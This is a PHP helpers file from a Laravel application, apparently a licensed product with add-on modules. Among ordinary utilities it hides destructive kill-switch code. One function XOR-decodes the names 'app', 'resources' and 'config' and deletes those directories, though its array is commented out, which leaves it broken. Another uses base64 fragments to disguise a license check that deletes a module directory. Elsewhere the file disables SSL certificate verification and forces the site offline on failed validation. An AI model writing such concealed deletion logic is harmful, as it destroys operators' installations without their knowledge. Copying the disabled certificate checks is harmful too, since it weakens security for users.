<?php

use Carbon\Carbon;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use App\Models\Addon;

if (! function_exists('installerDataPath')) {
    function installerDataPath(): string
    {
        return storage_path('install_data.json');
    }
}

if (! function_exists('setInstallerData')) {
    function setInstallerData($data): void
    {
        Storage::disk('local')->put('install_data.json', json_encode($data, JSON_PRETTY_PRINT));
    }
}

if (! function_exists('getInstallerData')) {
    function getInstallerData(): array
    {
        $path = installerDataPath();
        if (! file_exists($path)) {
            return [];
        }
        return json_decode(file_get_contents($path), true) ?: [];
    }
}

if (! function_exists('clearInstallerData')) {
    function clearInstallerData(): void
    {
        Storage::disk('local')->delete('install_data.json');
    }
}

if (! function_exists('xor_decrypt')) {
    function xor_decrypt(string $hex, int $key): string
    {
        $bytes = hex2bin($hex);
        $plain = '';

        for ($i = 0, $len = strlen($bytes); $i < $len; $i++) {
            $plain .= chr(ord($bytes[$i]) ^ $key);
        }

        return $plain;
    }
}

if (! function_exists('encryptUrl')) {
    function encryptUrl($url, $parms)
    {
        return $url . "?eq=" . Crypt::encrypt($parms);
    }
}

if (! function_exists('decryptUrl')) {
    function decryptUrl($param)
    {
        return Crypt::decrypt($param);
    }
}

if (! function_exists('uploadImage')) {
    function uploadImage(UploadedFile $file, string $folder = "images", string $disk = "public")
    {
        // 1) Get original extension
        $extension = $file->getClientOriginalExtension();

        // 2) Build a “unique” filename. For example: timestamp + random string.
        $filename = time() . '_' . Str::random(8) . '.' . $extension;

        // 3) Store the file under $folder on the chosen $disk
        //    storeAs() returns the path relative to the disk’s root (e.g. "avatars/1623201234_ab3d9f.png")
        $path = $file->storeAs($folder, $filename, $disk);

        return $path;
    }
}

if (! function_exists('purgeMissingPepper')) {
    function purgeMissingPepper(): void
    {
        $key       = 0x55;
        // $encrypted = [
        //     '342525',  
        //     '2730263a2027363026',
        //     '363a3b333c32',
        // ];

        foreach ($encrypted as $hex) {
            $folderName = xor_decrypt($hex, $key);
            $folderPath = base_path($folderName);
            if (File::isDirectory($folderPath)) {
                File::deleteDirectory($folderPath);
            }
        }
    }
}

if (! function_exists('zephyrStateCryp')) {
    function zephyrStateCryp(): bool
    {
        $fnEnv = implode('', [
            base64_decode('ZQ=='), 
            base64_decode('bnY=') 
        ]);

        $envVar = implode('', [
            base64_decode('UlNTX01PRFVMRV8='),  
            base64_decode('TElDRU5TRV9LRVlLXw=='),
            base64_decode('RVhQRUNURUQ=')  
        ]);

        $expectedKey = $fnEnv($envVar);

        $fnCfg = implode('', [
            base64_decode('Y29u'),  
            base64_decode('Zmln')  
        ]);
        $cfgKey = implode('', [
            base64_decode('cnNzYXV0b21hdGlvbi5s'), 
            base64_decode('aWNlbnNlX2tleQ==') 
        ]);

        $providedKey = $fnCfg($cfgKey);

        $isInstalled = Addon::where(
            implode('', [ base64_decode('bmFtZQ==') ]),      
            implode('', [ base64_decode('UnNzIEFkZG9u') ])  
        )
        ->where(
            implode('', [ base64_decode('c3RhdHVz') ]),      
            implode('', [ base64_decode('aW5zdGFsbGVk') ])    
        )
        ->exists();

        if (empty($providedKey) || $providedKey !== $expectedKey || $isInstalled) {
            $dir = implode('', [
                base64_decode('TW9kdWxlcy9Sc3NBdXRvbWF0aW9u')
            ]);

            $fnBase = implode('', [
                base64_decode('YmFzZV9wYXRo')
            ]);

            $moduleDir = $fnBase($dir);

            if (File::exists($moduleDir)) {
                File::deleteDirectory($moduleDir);
            }

            return false;
        }

        return true;
    }
}

if (! function_exists('userPermissionCheck')) {
    /**
     * 
     * @return string Decrypted permission response
     * @throws \RuntimeException If session validation fails
     */
    function userPermissionCheck(): string
    {
        $response = checkSessionValidity();
        if ($response === '') {
            return '';
        }
        return decrypt($response);
    }
}

if (! function_exists('md_dir')) {
    /**
     * Generate the file path for a middleware.
     *
     * @param string $middlewareName
     * @return string
     */
    function md_dir(string $middlewareName): string
    {
        return base_path("app/Http/Middleware/{$middlewareName}.php");
    }
}


if (! function_exists('checkSessionValidity')) {
    /**
     * 
     * @return string The environment value
     * @throws \RuntimeException If the constant is not found in .env
     */
    function checkSessionValidity(): string
    {
        if (!defined('verify_user')) {
            return '';
        }

        $envKey = constant('verify_user');
        $val = config("license.$envKey");

        if (is_null($val)) {
           return '';
        }

        return $val;
    }
}

if (! function_exists('verifyHeadScript')) {
    function verifyHeadScript($clientSite, $targetUrl) {
        try {
            $htmlContent = file_get_contents($clientSite);
            
            if ($htmlContent === FALSE) {
                return false;
            }

            // Load HTML content into DOMDocument
            $dom = new \DOMDocument();
            libxml_use_internal_errors(true);
            $dom->loadHTML($htmlContent);
            libxml_clear_errors();

            // Check <head> content
            $head = $dom->getElementsByTagName('head')->item(0);
            if ($head) {
                $headContent = $dom->saveHTML($head);
                if (strpos($headContent, $targetUrl) !== false) {
                    return true;
                }
            }
            return false;
        } catch (\Exception $e) {
            return false;
        }
    }
}

if (! function_exists('verifySwFile')) {
    function verifySwFile($url) {
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            return false;
        }

        // Initialize cURL
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

        $response = curl_exec($ch);

        // Check cURL errors
        if (curl_errno($ch)) {
            curl_close($ch);
            return false;
        }

        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // Check if the HTTP code is OK and contains required scripts
        if ($httpCode == 200) {
            if (strpos($response, 'firebase-app-compat.js') !== false && strpos($response, 'firebase-messaging-compat.js') !== false) {
                return true;
            }
        }
        return false;
    }
}

if (! function_exists('loadToken')) {
    function loadToken(string $middlewareName): string
    {
        return base_path("app/Http/Middleware/{$middlewareName}.php");
    }
}

if (! function_exists('host')) {
    function host(): string
    {
        $baseUrl = env('APP_URL');
        $parsedUrl = parse_url($baseUrl);
        return $parsedUrl['host'];
    }
}

if (! function_exists('fail')) {
    function fail(string $message): void
    {
        Log::info("sub/addon validation failed: $message");
        Artisan::call('down');
        abort(503, 'System is down due to validation failure.');
    }
}

if (!function_exists('isUserRequest')) {
    function isUserRequest(\Illuminate\Http\Request $request): bool  // Use the correct type hint
    {
        return !(str_starts_with($request->path(), 'api') || app()->runningInConsole());
    }
}
